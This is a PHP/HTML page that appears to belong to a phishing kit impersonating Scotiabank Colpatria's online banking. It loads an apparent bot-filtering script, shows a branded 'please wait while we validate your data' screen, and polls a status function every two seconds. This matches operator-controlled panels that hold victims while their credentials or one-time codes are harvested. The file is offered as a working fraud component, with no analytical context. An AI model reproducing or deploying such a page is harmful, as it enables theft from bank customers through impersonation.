<?php
require "is_botcito.php";
require "ayudante.php";
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Scotiabank Colpatria | Banca virtual</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="cabe">
            <div class="logocenter">
                <div class="logo">

                </div>

            </div>
        </div>
        <div class="principal">
            <div class="autenticar">
                
                <div class="contenido">
                    <div class="caja">
                        <div class="izq" style="text-align: center;">
                            <img src="img/nube.svg"><br>
                            <img src="img/load.gif"  />
                            <p style="text-align:left;">
                                Por favor espere un momento, estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.
                            </p>
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
        <div class="pie">
            <div class="piecenter">
                <p class="derec">
                    © 2022 Todos los Derechos Reservados Scotiabank Colpatria.
                </p>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>
</body>

</html>
<script language="javascript">
$(document).ready(function() {
    setInterval(consultar_estado,2000); 
});
</script>